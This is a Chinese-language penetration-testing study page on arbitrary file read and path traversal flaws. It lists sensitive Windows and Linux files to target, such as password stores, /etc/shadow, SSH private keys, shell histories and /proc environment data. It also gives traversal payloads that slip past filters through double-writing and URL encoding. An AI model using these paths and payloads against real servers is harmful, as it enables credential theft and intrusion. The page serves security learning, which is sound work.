---
title: Fileread
createTime: 2024/10/16 20:20:40
permalink: /learn/jgx2tj2z/
---

# Fileread

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**相关文章**

- [渗透测试-任意文件读取/下载漏洞](https://mp.weixin.qq.com/s/fpYKgybCQdSd5_AafNvt4w)

**相关案例**

- [京东商城两处任意目录遍历下载漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0214222)
- [2 Path Traversal Cases](https://jlajara.gitlab.io/web/2020/03/29/Path_Traversal.html)
- [电信某分站配置不当导致敏感文件泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-095088)
- [一个任意文件读取漏洞记录](https://toutiao.io/posts/423535/app_preview)
- [南方周末邮件服务器任意文件读取漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-045426)
- [一次文件读取漏洞的“危害升级”历程](https://www.freebuf.com/vuls/257629.html)

---

## 利用思路

### windows

**常规配置文件**

```
C:\windows\win.ini                          //可以用来判断是否为windows系统
C:\boot.ini                                 //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml    //IIS 配置文件
C:\Windows\repair\sam                       //存储系统初次安装的密码
C:\Program Files\mysql\my.ini               //Mysql 配置
C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
C:\Windows\php.ini                          //php 配置信息
C:\Windows\my.ini                           //Mysql 配置信息
```

**Windows Search 索引文件(需要管理员权限)**

这个文件一般特别大,不是很推荐这种利用方法 😅

```
%ProgramData%\Microsoft\Search\Data\Applications\Windows\Windows.edb
```

**日志文件**

%systemroot%\System32\winevt\Logs 目录下

```
Application.evtx
ConnectionInfo.evtx
Error.evtx
HardwareEvents.evtx
Internet Explorer.evtx
Key Management Service.evtx
Media Center.evtx
Microsoft-Windows-API-Tracing%4Operational.evtx
Microsoft-Windows-AppID%4Operational.evtx
Microsoft-Windows-Application Server-Applications%4Admin.evtx
Microsoft-Windows-Application Server-Applications%4Operational.evtx
Microsoft-Windows-Application-Experience%4Problem-Steps-Recorder.evtx
Microsoft-Windows-Application-Experience%4Program-Compatibility-Assistant.evtx
Microsoft-Windows-Application-Experience%4Program-Compatibility-Troubleshooter.evtx
Microsoft-Windows-Application-Experience%4Program-Inventory.evtx
Microsoft-Windows-Application-Experience%4Program-Telemetry.evtx
```

**命令行历史记录**

```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### linux

**系统信息**

```
/etc/passwd
/etc/shadow
/etc/hosts
```

**历史记录**

```
/var/lib/mlocate/mlocate.db     # locate命令的索引数据库文件
/root/.bash_history             # bash 历史记录
/root/.mysql_history            # mysql 的 bash 历史记录
/root/.wget-hsts
```

**配置文件**

```
/opt/nginx/conf/nginx.conf      # nginx 的配置文件
/var/www/html/index.html
/etc/redis.conf
/etc/my.cnf
/etc/httpd/conf/httpd.conf      # httpd 的配置文件
```

**软硬件信息/进程信息**

```
/proc/self/fd/fd[0-9]*(文件标识符)
/proc/mounts
/porc/config.gz
/proc/sched_debug   # 提供 cpu 上正在运行的进程信息，可以获得进程的 pid 号，可以配合后面需要 pid的利用
/proc/mounts        # 挂载的文件系统列表
/proc/net/arp       # arp 表，可以获得内网其他机器的地址
/proc/net/route     # 路由表信息
/proc/net/tcp
/proc/net/udp       # 活动连接的信息
/proc/net/fib_trie  # 路由缓存
/proc/version       # 内核版本
/proc/[PID]/cmdline # 可能包含有用的路径信息
/proc/[PID]/environ # 程序运行的环境变量信息，可以用来包含 getshell
/proc/[PID]/cwd     # 当前进程的工作目录
/proc/[PID]/fd/[#]  # 访问檔案描述符
```

**ssh**

```
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
/etc/ssh/sshd_config
/var/log/secure
```

**网络配置**

```
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/syscomfig/network-scripts/ifcfg-eth1
```

**locate.db**

Linux locate 命令用于查找符合条件的文档。一般输入 `locate xxx` 即可查找指定文件

locate 其会去保存文档和目录名称到数据库内(这个数据库中含有本地所有文件信息。Linux 系统自动创建这个数据库，并且每天自动更新一次)，然后查找合乎范本样式条件的文档或目录。一般这个数据库的位置在:

```
/var/lib/mlocate/mlocate.db
```

寻找 mlocate.db 中所有带有 properties 的路径

```bash
locate mlocate.db properties
```

---

## 绕过技巧

### 双写

- `../../../etc/passwd`
- `..././.././etc/passwd`

### 编码

- `../../../etc/passwd`
- `..%2F..%2F..%2Fetc%2Fpasswd`
- `..%252F..%252F..%252Fetc%252Fpasswd`
